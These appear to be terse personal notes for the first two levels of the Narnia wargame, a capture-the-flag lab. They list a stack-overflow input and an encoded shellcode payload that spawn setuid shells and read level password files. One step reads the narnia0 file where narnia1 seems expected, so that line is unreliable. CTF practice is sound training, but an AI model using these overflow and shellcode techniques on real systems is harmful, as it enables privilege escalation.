# narnia 0 -> narnia 1
file narnia0
file narnia0.c
vim narnia0.c
mkdir /tmp/zulu
cd /tmp/zulu
# After several tries, seems we need to use echo chained with cat to pass correct val in hex dump transl. to narnia0 executable to 1. open shell with narnia1 perm and 2. keep shel open
( echo -e "AAAAAAAAAAAAAAAAAAAAAAAAAA\xef\xbe\xad\xde"; cat; ) | /narnia/narnia0
whoami
cat /etc/narnia_pass/narnia0

# narnia 1 -> narnia 2
vim narnia1.c
./narnia1
export EGG=az
echo $EGG
./narnia1
gdb narnia1
disassemble main
break *0x080484b6
run
x/25x $eax
q
# Here we need to find the correct shell code. A lot of them are referenced at shell-storm.org
export EGG=$(python -c 'print "\xeb\x11\x5e\x31\xc9\xb1\x21\x80\x6c\x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x6b\x0c\x59\x9a\x53\x67\x69\x2e\x71\x8a\xe2\x53\x6b\x69\x69\x30\x63\x62\x74\x69\x30\x63\x6a\x6f\x8a\xe4\x53\x52\x54\x8a\xe2\xce\x81"')
./narnia1
whoami
id
cat /etc/narnia_pass/narnia2





